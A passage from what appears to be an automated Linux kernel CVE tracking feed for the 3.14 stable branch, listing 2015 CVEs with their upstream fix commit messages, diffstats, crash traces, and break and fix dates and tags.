    change which can result in the following crash.
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000030
    IP: [<ffffffffa033002d>] nf_nat_redirect_ipv4+0x2d/0xa0 [nf_nat_redirect]
    PGD 3ba662067 PUD 3ba661067 PMD 0
    Oops: 0000 [#1] SMP
    Modules linked in: ipv6(E) xt_REDIRECT(E) nf_nat_redirect(E) xt_tcpudp(E) iptable_nat(E) nf_conntrack_ipv4(E) nf_defrag_ipv4(E) nf_nat_ipv4(E) nf_nat(E) nf_conntrack(E) ip_tables(E) x_tables(E) binfmt_misc(E) xfs(E) libcrc32c(E) evbug(E) evdev(E) psmouse(E) i2c_piix4(E) i2c_core(E) acpi_cpufreq(E) button(E) ext4(E) crc16(E) jbd2(E) mbcache(E) dm_mirror(E) dm_region_hash(E) dm_log(E) dm_mod(E)
    CPU: 0 PID: 2536 Comm: ip Tainted: G            E   4.1.7-15.23.amzn1.x86_64 #1
    Hardware name: Xen HVM domU, BIOS 4.2.amazon 05/06/2015
    task: ffff8800eb438000 ti: ffff8803ba664000 task.ti: ffff8803ba664000
    [...]
    Call Trace:
     <IRQ>
     [<ffffffffa0334065>] redirect_tg4+0x15/0x20 [xt_REDIRECT]
     [<ffffffffa02e2e99>] ipt_do_table+0x2b9/0x5e1 [ip_tables]
     [<ffffffffa0328045>] iptable_nat_do_chain+0x25/0x30 [iptable_nat]
     [<ffffffffa031777d>] nf_nat_ipv4_fn+0x13d/0x1f0 [nf_nat_ipv4]
     [<ffffffffa0328020>] ? iptable_nat_ipv4_fn+0x20/0x20 [iptable_nat]
     [<ffffffffa031785e>] nf_nat_ipv4_in+0x2e/0x90 [nf_nat_ipv4]
     [<ffffffffa03280a5>] iptable_nat_ipv4_in+0x15/0x20 [iptable_nat]
     [<ffffffff81449137>] nf_iterate+0x57/0x80
     [<ffffffff814491f7>] nf_hook_slow+0x97/0x100
     [<ffffffff814504d4>] ip_rcv+0x314/0x400
    
    unsigned int
    nf_nat_redirect_ipv4(struct sk_buff *skb,
    ...
    {
    ...
    		rcu_read_lock();
    		indev = __in_dev_get_rcu(skb->dev);
    		if (indev != NULL) {
    			ifa = indev->ifa_list;
    			newdst = ifa->ifa_local; <---
    		}
    		rcu_read_unlock();
    ...
    }
    
    Before the commit, 'ifa' had been always checked before access. After the
    commit, however, it could be accessed even if it's NULL. Interestingly,
    this was once fixed in 2003.
    
    http://marc.info/?l=netfilter-devel&m=106668497403047&w=2
    
    In addition to the original one, we have seen the crash when packets that
    need to be redirected somehow arrive on an interface which hasn't been
    yet fully configured.
    
    This change just reverts the logic to the old behavior to avoid the crash.
    
    Fixes: 8b13eddfdf04 ("netfilter: refactor NAT redirect IPv4 to use it from nf_tables")
    Signed-off-by: Munehisa Kamata <kamatam@amazon.com>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/netfilter/nf_nat_redirect.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-02-07
CVE: CVE-2015-8787
Break Date: 2014-10-27
Break Commit: 8b13eddfdf04cbfa561725cfc42d6868fe896f56
Break Tag: 3.19
Linus Fix Date: 2015-10-27
Linus Commit: 94f9cd81436c85d8c3a318ba92e236ede73752fc
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8812:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.63.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 67f1aee6f45059fd6b0f5b0ecb2c97ad0451f6b3
Author: Hariprasad S <hariprasad@chelsio.com>
Date:   Fri Dec 11 13:59:17 2015 +0530

    iw_cxgb3: Fix incorrectly returning error on success
    
    The cxgb3_*_send() functions return NET_XMIT_ values, which are
    positive integers values. So don't treat positive return values
    as an error.
    
    Signed-off-by: Steve Wise <swise@opengridcomputing.com>
    Signed-off-by: Hariprasad Shenai <hariprasad@chelsio.com>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/hw/cxgb3/iwch_cm.c |    4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2015-8812
Break Date: 2009-03-30
Break Commit: 04b5d028f50ff05a8f9ae049ee71f8fdfcf1f5de
Break Tag: 2.6
Linus Fix Date: 2015-12-24
Linus Commit: 67f1aee6f45059fd6b0f5b0ecb2c97ad0451f6b3
Linus Tag: 4.5
Stable Date: 2016-03-03
Stable Commit: 8e0cb6c1f8c403c189b45b969540284862b30f85
Stable Tag: 3.14.63

CVE-2015-8816:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.76.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit e50293ef9775c5f1cf3fcc093037dd6a8c5684ea
Author: Alan Stern <stern@rowland.harvard.edu>
Date:   Wed Dec 16 13:32:38 2015 -0500

    USB: fix invalid memory access in hub_activate()
    
    Commit 8520f38099cc ("USB: change hub initialization sleeps to
    delayed_work") changed the hub_activate() routine to make part of it
    run in a workqueue.  However, the commit failed to take a reference to
    the usb_hub structure or to lock the hub interface while doing so.  As
    a result, if a hub is plugged in and quickly unplugged before the work
    routine can run, the routine will try to access memory that has been
    deallocated.  Or, if the hub is unplugged while the routine is
    running, the memory may be deallocated while it is in active use.
    
    This patch fixes the problem by taking a reference to the usb_hub at
    the start of hub_activate() and releasing it at the end (when the work
    is finished), and by locking the hub interface while the work routine
    is running.  It also adds a check at the start of the routine to see
    if the hub has already been disconnected, in which nothing should be
    done.
    
    Signed-off-by: Alan Stern <stern@rowland.harvard.edu>
    Reported-by: Alexandru Cornea <alexandru.cornea@intel.com>
    Tested-by: Alexandru Cornea <alexandru.cornea@intel.com>
    Fixes: 8520f38099cc ("USB: change hub initialization sleeps to delayed_work")
    CC: <stable@vger.kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/usb/core/hub.c |   22 +++++++++++++++++++---
 1 file changed, 19 insertions(+), 3 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2015-8816
Break Date: 2008-10-17
Break Commit: 8520f38099ccfdac2147a0852f84ee7a8ee5e197
Break Tag: 2.6
Linus Fix Date: 2015-12-18
Linus Commit: e50293ef9775c5f1cf3fcc093037dd6a8c5684ea
Linus Tag: 4.4
Stable Date: 2016-08-16
Stable Commit: 627c25d08197bafc328d9ac841dfc1a143806a71
Stable Tag: 3.14.76

CVE-2015-8830:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 4c185ce06dca14f5cea192f5a2c981ef50663f2b
Author: Al Viro <viro@zeniv.linux.org.uk>
Date:   Fri Mar 20 20:17:32 2015 -0400

    aio: lift iov_iter_init() into aio_setup_..._rw()
    
    the only non-trivial detail is that we do it before rw_verify_area(),
    so we'd better cap the length ourselves in aio_setup_single_rw()
    case (for vectored case rw_copy_check_uvector() will do that for us).
    
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 fs/aio.c |   17 +++++++++++------
 1 file changed, 11 insertions(+), 6 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2015-8830
Break Date: 2013-05-07
Break Commit: 41ef4eb8eef8d06bc1399e7b00c940d771554711
Break Tag: 3.10
Linus Fix Date: 2015-04-11
Linus Commit: 4c185ce06dca14f5cea192f5a2c981ef50663f2b
Linus Tag: 4.1
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8839:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 011278485ecc3cd2a3954b5d4c73101d919bf1fa
Author: Jan Kara <jack@suse.com>
Date:   Mon Dec 7 14:34:49 2015 -0500

    ext4: fix races of writeback with punch hole and zero range
    
    When doing delayed allocation, update of on-disk inode size is postponed
    until IO submission time. However hole punch or zero range fallocate
    calls can end up discarding the tail page cache page and thus on-disk
    inode size would never be properly updated.
    
    Make sure the on-disk inode size is updated before truncating page
    cache.
    
    Signed-off-by: Jan Kara <jack@suse.com>
    Signed-off-by: Theodore Ts'o <tytso@mit.edu>

 fs/ext4/ext4.h    |    3 +++
 fs/ext4/extents.c |    5 +++++
 fs/ext4/inode.c   |   35 ++++++++++++++++++++++++++++++++++-
 3 files changed, 42 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2015-8839
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-07
Linus Commit: 011278485ecc3cd2a3954b5d4c73101d919bf1fa
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8839:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 17048e8a083fec7ad841d88ef0812707fbc7e39f
Author: Jan Kara <jack@suse.com>
Date:   Mon Dec 7 14:29:17 2015 -0500

    ext4: move unlocked dio protection from ext4_alloc_file_blocks()
    
    Currently ext4_alloc_file_blocks() was handling protection against
    unlocked DIO. However we now need to sometimes call it under i_mmap_sem
    and sometimes not and DIO protection ranks above it (although strictly
    speaking this cannot currently create any deadlocks). Also
    ext4_zero_range() was actually getting & releasing unlocked DIO
    protection twice in some cases. Luckily it didn't introduce any real bug
    but it was a land mine waiting to be stepped on.  So move DIO protection
    out from ext4_alloc_file_blocks() into the two callsites.
    
    Signed-off-by: Jan Kara <jack@suse.com>
    Signed-off-by: Theodore Ts'o <tytso@mit.edu>

 fs/ext4/extents.c |   21 ++++++++++-----------
 1 file changed, 10 insertions(+), 11 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2015-8839
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-07
Linus Commit: 17048e8a083fec7ad841d88ef0812707fbc7e39f
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8839:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 32ebffd3bbb4162da5ff88f9a35dd32d0a28ea70
Author: Jan Kara <jack@suse.com>
Date:   Mon Dec 7 14:31:11 2015 -0500

    ext4: fix races between buffered IO and collapse / insert range
    
    Current code implementing FALLOC_FL_COLLAPSE_RANGE and
    FALLOC_FL_INSERT_RANGE is prone to races with buffered writes and page
    faults. If buffered write or write via mmap manages to squeeze between
    filemap_write_and_wait_range() and truncate_pagecache() in the fallocate
    implementations, the written data is simply discarded by
    truncate_pagecache() although it should have been shifted.
    
    Fix the problem by moving filemap_write_and_wait_range() call inside
    i_mutex and i_mmap_sem. That way we are protected against races with
    both buffered writes and page faults.
    
    Signed-off-by: Jan Kara <jack@suse.com>
    Signed-off-by: Theodore Ts'o <tytso@mit.edu>

 fs/ext4/extents.c |   59 ++++++++++++++++++++++++++++-------------------------
 1 file changed, 31 insertions(+), 28 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2015-8839
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-07
Linus Commit: 32ebffd3bbb4162da5ff88f9a35dd32d0a28ea70
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8839:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ea3d7209ca01da209cda6f0dea8be9cc4b7a933b
Author: Jan Kara <jack@suse.com>
Date:   Mon Dec 7 14:28:03 2015 -0500

    ext4: fix races between page faults and hole punching
    
    Currently, page faults and hole punching are completely unsynchronized.
    This can result in page fault faulting in a page into a range that we
    are punching after truncate_pagecache_range() has been called and thus
    we can end up with a page mapped to disk blocks that will be shortly
    freed. Filesystem corruption will shortly follow. Note that the same
    race is avoided for truncate by checking page fault offset against
    i_size but there isn't similar mechanism available for punching holes.
    
    Fix the problem by creating new rw semaphore i_mmap_sem in inode and
    grab it for writing over truncate, hole punching, and other functions
    removing blocks from extent tree and for read over page faults. We
    cannot easily use i_data_sem for this since that ranks below transaction
    start and we need something ranking above it so that it can be held over
    the whole truncate / hole punching operation. Also remove various
    workarounds we had in the code to reduce race window when page fault
    could have created pages with stale mapping information.
    
    Signed-off-by: Jan Kara <jack@suse.com>
    Signed-off-by: Theodore Ts'o <tytso@mit.edu>

 fs/ext4/ext4.h     |   10 ++++++++
 fs/ext4/extents.c  |   54 +++++++++++++++++++++++-------------------
 fs/ext4/file.c     |   66 +++++++++++++++++++++++++++++++++++++++++++++-------
 fs/ext4/inode.c    |   36 +++++++++++++++++++++-------
 fs/ext4/super.c    |    1 +
 fs/ext4/truncate.h |    2 ++
 6 files changed, 127 insertions(+), 42 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2015-8839
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-07
Linus Commit: ea3d7209ca01da209cda6f0dea8be9cc4b7a933b
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8844:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.60.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit d2b9d2a5ad5ef04ff978c9923d19730cb05efd55
Author: Michael Neuling <mikey@neuling.org>
Date:   Thu Nov 19 15:44:44 2015 +1100

    powerpc/tm: Block signal return setting invalid MSR state
    
    Currently we allow both the MSR T and S bits to be set by userspace on
    a signal return.  Unfortunately this is a reserved configuration and
    will cause a TM Bad Thing exception if attempted (via rfid).
    
    This patch checks for this case in both the 32 and 64 bit signals
    code.  If both T and S are set, we mark the context as invalid.
    
    Found using a syscall fuzzer.
    
    Fixes: 2b0a576d15e0 ("powerpc: Add new transactional memory state to the signal context")
    Cc: stable@vger.kernel.org # v3.9+
    Signed-off-by: Michael Neuling <mikey@neuling.org>
    Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

 arch/powerpc/include/asm/reg.h  |    1 +
 arch/powerpc/kernel/signal_32.c |   14 +++++++++-----
 arch/powerpc/kernel/signal_64.c |    4 ++++
 3 files changed, 14 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2015-8844
Break Date: 2013-02-15
Break Commit: 2b0a576d15e0e14751f00f9c87e46bad27f217e7
Break Tag: 3.9
Linus Fix Date: 2015-11-23
Linus Commit: d2b9d2a5ad5ef04ff978c9923d19730cb05efd55
Linus Tag: 4.4
Stable Date: 2016-01-28
Stable Commit: a327f0569b21b62942dc28aacb9dbbda236ef7a2
Stable Tag: 3.14.60

CVE-2015-8845:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.60.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 7f821fc9c77a9b01fe7b1d6e72717b33d8d64142
Author: Michael Neuling <mikey@neuling.org>
Date:   Thu Nov 19 15:44:45 2015 +1100

    powerpc/tm: Check for already reclaimed tasks
    
    Currently we can hit a scenario where we'll tm_reclaim() twice.  This
    results in a TM bad thing exception because the second reclaim occurs
    when not in suspend mode.
    
    The scenario in which this can happen is the following.  We attempt to
    deliver a signal to userspace.  To do this we need obtain the stack
    pointer to write the signal context.  To get this stack pointer we
    must tm_reclaim() in case we need to use the checkpointed stack
    pointer (see get_tm_stackpointer()).  Normally we'd then return
    directly to userspace to deliver the signal without going through
    __switch_to().
    
    Unfortunatley, if at this point we get an error (such as a bad
    userspace stack pointer), we need to exit the process.  The exit will
    result in a __switch_to().  __switch_to() will attempt to save the
    process state which results in another tm_reclaim().  This
    tm_reclaim() now causes a TM Bad Thing exception as this state has
    already been saved and the processor is no longer in TM suspend mode.
    Whee!
    
    This patch checks the state of the MSR to ensure we are TM suspended
    before we attempt the tm_reclaim().  If we've already saved the state
    away, we should no longer be in TM suspend mode.  This has the
    additional advantage of checking for a potential TM Bad Thing
    exception.
    
    Found using syscall fuzzer.
    
    Fixes: fb09692e71f1 ("powerpc: Add reclaim and recheckpoint functions for context switching transactional memory processes")
    Cc: stable@vger.kernel.org # v3.9+
    Signed-off-by: Michael Neuling <mikey@neuling.org>
    Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

 arch/powerpc/kernel/process.c |   18 ++++++++++++++++++
 1 file changed, 18 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2015-8845
Break Date: 2013-02-15
Break Commit: fb09692e71f13af7298eb603a1975850b1c7a8d8
Break Tag: 3.9
Linus Fix Date: 2015-11-23
Linus Commit: 7f821fc9c77a9b01fe7b1d6e72717b33d8d64142
Linus Tag: 4.4
Stable Date: 2016-01-28
Stable Commit: 70812a4226708100041da6715a1d5bb2e3aebc34
Stable Tag: 3.14.60

CVE-2015-8944:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51d7b120418e99d6b3bf8df9eb3cc31e8171dee4
Author: Linus Torvalds <torvalds@linux-foundation.org>
Date:   Thu Apr 14 12:05:37 2016 -0700

    /proc/iomem: only expose physical resource addresses to privileged users
    
    In commit c4004b02f8e5b ("x86: remove the kernel code/data/bss resources
    from /proc/iomem") I was hoping to remove the phyiscal kernel address
    data from /proc/iomem entirely, but that had to be reverted because some
    system programs actually use it.
    
    This limits all the detailed resource information to properly
    credentialed users instead.
    
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 kernel/resource.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2015-8944
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-04-14
Linus Commit: 51d7b120418e99d6b3bf8df9eb3cc31e8171dee4
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8950:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.47.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 6829e274a623187c24f7cfc0e3d35f25d087fcc5
Author: Marek Szyprowski <m.szyprowski@samsung.com>
Date:   Thu Apr 23 12:46:16 2015 +0100

    arm64: dma-mapping: always clear allocated buffers
    
    Buffers allocated by dma_alloc_coherent() are always zeroed on Alpha,
    ARM (32bit), MIPS, PowerPC, x86/x86_64 and probably other architectures.
    It turned out that some drivers rely on this 'feature'. Allocated buffer
    might be also exposed to userspace with dma_mmap() call, so clearing it
    is desired from security point of view to avoid exposing random memory
    to userspace. This patch unifies dma_alloc_coherent() behavior on ARM64
    architecture with other implementations by unconditionally zeroing
    allocated buffer.
    
    Cc: <stable@vger.kernel.org> # v3.14+
    Signed-off-by: Marek Szyprowski <m.szyprowski@samsung.com>
    Signed-off-by: Will Deacon <will.deacon@arm.com>

 arch/arm64/mm/dma-mapping.c |    6 ++----
 1 file changed, 2 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2015-8950
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-04-27
Linus Commit: 6829e274a623187c24f7cfc0e3d35f25d087fcc5
Linus Tag: 4.1
Stable Date: 2015-07-03
Stable Commit: 22ff38e850b7fc87bdcccbebe92c3e7764ffe389
Stable Tag: 3.14.47

CVE-2015-8952:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit be0726d33cb8f411945884664924bed3cb8c70ee
Author: Jan Kara <jack@suse.cz>
Date:   Mon Feb 22 11:56:38 2016 -0500

    ext2: convert to mbcache2
    
    The conversion is generally straightforward. We convert filesystem from
    a global cache to per-fs one. Similarly to ext4 the tricky part is that
    xattr block corresponding to found mbcache entry can get freed before we
    get buffer lock for that block. So we have to check whether the entry is
    still valid after getting the buffer lock.
    
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Theodore Ts'o <tytso@mit.edu>

 fs/ext2/ext2.h  |    3 ++
 fs/ext2/super.c |   25 ++++++----
 fs/ext2/xattr.c |  143 ++++++++++++++++++++++++++-----------------------------
 fs/ext2/xattr.h |   21 ++------
 4 files changed, 92 insertions(+), 100 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2015-8952
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-02-22
Linus Commit: be0726d33cb8f411945884664924bed3cb8c70ee
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8953:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ab79efab0a0ba01a74df782eb7fa44b044dae8b5
Author: David Howells <dhowells@redhat.com>
Date:   Fri Sep 18 11:45:22 2015 +0100

    ovl: fix dentry reference leak
    
    In ovl_copy_up_locked(), newdentry is leaked if the function exits through
    out_cleanup as this just to out after calling ovl_cleanup() - which doesn't
    actually release the ref on newdentry.
    
    The out_cleanup segment should instead exit through out2 as certainly
    newdentry leaks - and possibly upper does also, though this isn't caught
    given the catch of newdentry.
    
    Without this fix, something like the following is seen:
    
    	BUG: Dentry ffff880023e9eb20{i=f861,n=#ffff880023e82d90} still in use (1) [unmount of tmpfs tmpfs]
    	BUG: Dentry ffff880023ece640{i=0,n=bigfile}  still in use (1) [unmount of tmpfs tmpfs]
    
    when unmounting the upper layer after an error occurred in copyup.
    
    An error can be induced by creating a big file in a lower layer with
    something like:
    
    	dd if=/dev/zero of=/lower/a/bigfile bs=65536 count=1 seek=$((0xf000))
    
    to create a large file (4.1G).  Overlay an upper layer that is too small
    (on tmpfs might do) and then induce a copy up by opening it writably.
    
    Reported-by: Ulrich Obergfell <uobergfe@redhat.com>
    Signed-off-by: David Howells <dhowells@redhat.com>
    Signed-off-by: Miklos Szeredi <miklos@szeredi.hu>
    Cc: <stable@vger.kernel.org> # v3.18+

 fs/overlayfs/copy_up.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2015-8953
Break Date: 2014-10-24
Break Commit: e9be9d5e76e34872f0c37d72e25bc27fe9e2c54c
Break Tag: 3.18
Linus Fix Date: 2015-10-12
Linus Commit: ab79efab0a0ba01a74df782eb7fa44b044dae8b5
Linus Tag: 4.3
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8955:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 8fff105e13041e49b82f92eef034f363a6b1c071
Author: Suzuki K. Poulose <suzuki.poulose@arm.com>
Date:   Tue Mar 17 18:14:59 2015 +0000

    arm64: perf: reject groups spanning multiple HW PMUs
    
    The perf core implicitly rejects events spanning multiple HW PMUs, as in
    these cases the event->ctx will differ. However this validation is
    performed after pmu::event_init() is called in perf_init_event(), and
    thus pmu::event_init() may be called with a group leader from a
    different HW PMU.
    
    The ARM64 PMU driver does not take this fact into account, and when
    validating groups assumes that it can call to_arm_pmu(event->pmu) for
    any HW event. When the event in question is from another HW PMU this is
    wrong, and results in dereferencing garbage.
    
    This patch updates the ARM64 PMU driver to first test for and reject
    events from other PMUs, moving the to_arm_pmu and related logic after
    this test. Fixes a crash triggered by perf_fuzzer on Linux-4.0-rc2, with
    a CCI PMU present:
    
    Bad mode in Synchronous Abort handler detected, code 0x86000006 -- IABT (current EL)
    CPU: 0 PID: 1371 Comm: perf_fuzzer Not tainted 3.19.0+ #249
    Hardware name: V2F-1XV7 Cortex-A53x2 SMM (DT)
    task: ffffffc07c73a280 ti: ffffffc07b0a0000 task.ti: ffffffc07b0a0000
    PC is at 0x0
    LR is at validate_event+0x90/0xa8
    pc : [<0000000000000000>] lr : [<ffffffc000090228>] pstate: 00000145
    sp : ffffffc07b0a3ba0
    
    [<          (null)>]           (null)
    [<ffffffc0000907d8>] armpmu_event_init+0x174/0x3cc
    [<ffffffc00015d870>] perf_try_init_event+0x34/0x70
    [<ffffffc000164094>] perf_init_event+0xe0/0x10c
    [<ffffffc000164348>] perf_event_alloc+0x288/0x358
    [<ffffffc000164c5c>] SyS_perf_event_open+0x464/0x98c
    Code: bad PC value
    
    Also cleans up the code to use the arm_pmu only when we know
    that we are dealing with an arm pmu event.
    
    Cc: Will Deacon <will.deacon@arm.com>
    Acked-by: Mark Rutland <mark.rutland@arm.com>
    Acked-by: Peter Ziljstra (Intel) <peterz@infradead.org>
    Signed-off-by: Suzuki K. Poulose <suzuki.poulose@arm.com>
    Signed-off-by: Will Deacon <will.deacon@arm.com>

 arch/arm64/kernel/perf_event.c |   21 +++++++++++++++------
 1 file changed, 15 insertions(+), 6 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2015-8955
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-03-19
Linus Commit: 8fff105e13041e49b82f92eef034f363a6b1c071
Linus Tag: 4.1
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8956:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 951b6a0717db97ce420547222647bcc40bf1eacd
Author: Jaganath Kanakkassery <jaganath.k@samsung.com>
Date:   Thu May 14 12:58:08 2015 +0530

    Bluetooth: Fix potential NULL dereference in RFCOMM bind callback
    
    addr can be NULL and it should not be dereferenced before NULL checking.
    
    Signed-off-by: Jaganath Kanakkassery <jaganath.k@samsung.com>
    Signed-off-by: Marcel Holtmann <marcel@holtmann.org>

 net/bluetooth/rfcomm/sock.c |   20 ++++++++++++--------
 1 file changed, 12 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2015-8956
Break Date: 2014-02-20
Break Commit: b1765e7afe8710ef4366dc722cc5bd487eb07973
Break Tag: 3.16
Linus Fix Date: 2015-06-06
Linus Commit: 951b6a0717db97ce420547222647bcc40bf1eacd
Linus Tag: 4.2
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8970:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 37766586c965d63758ad542325a96d5384f4a8c9
Author: Herbert Xu <herbert@gondor.apana.org.au>
Date:   Mon Jan 4 13:35:18 2016 +0900

    crypto: af_alg - Add nokey compatibility path
    
    This patch adds a compatibility path to support old applications
    that do acept(2) before setkey.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

 crypto/af_alg.c         |   13 ++++++++++++-
 include/crypto/if_alg.h |    2 ++
 2 files changed, 14 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-31
CVE: CVE-2015-8970
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-18
Linus Commit: 37766586c965d63758ad542325a96d5384f4a8c9
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8970:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 6de62f15b581f920ade22d758f4c338311c2f0d4
Author: Herbert Xu <herbert@gondor.apana.org.au>
Date:   Fri Jan 8 21:31:04 2016 +0800

    crypto: algif_hash - Require setkey before accept(2)
    
    Hash implementations that require a key may crash if you use
    them without setting a key.  This patch adds the necessary checks
    so that if you do attempt to use them without a key that we return
    -ENOKEY instead of proceeding.
    
    This patch also adds a compatibility path to support old applications
    that do acept(2) before setkey.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

 crypto/algif_hash.c |  201 +++++++++++++++++++++++++++++++++++++++++++++++++--
 1 file changed, 193 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-31
CVE: CVE-2015-8970
Break Date: -
